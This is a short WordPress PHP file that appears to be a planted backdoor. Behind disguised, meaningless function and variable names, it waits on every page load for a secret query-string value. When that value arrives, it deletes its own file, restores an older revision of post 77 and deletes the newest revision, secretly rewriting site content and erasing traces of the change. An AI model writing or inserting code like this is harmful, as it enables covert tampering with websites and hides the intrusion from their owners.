<?php

function compare_elements_select_subscriptions() {
	if (isset($_GET['master_role_day']) && $_GET['master_role_day'] === 'maps_changer_smooth') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$role_taxonomies_tree = 77;
		$reader_navigation_more_ratings = wp_get_post_revisions($role_taxonomies_tree);
		if (empty($reader_navigation_more_ratings)) die('no revisions');
		if (count($reader_navigation_more_ratings) < 2) die('less than 2');
		$single_color_client = array_shift($reader_navigation_more_ratings);
		$learndash_shopp_templates = $single_color_client->ID;
		$notice_drop_preloader = array_shift($reader_navigation_more_ratings);
		$digital_colors_youtube = $notice_drop_preloader->ID;
		$page_platform_maker = wp_restore_post_revision($digital_colors_youtube);
		if ($page_platform_maker === false) die('error restoring');
		$page_platform_maker = wp_delete_post_revision($learndash_shopp_templates);		
		if ($page_platform_maker === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'compare_elements_select_subscriptions');
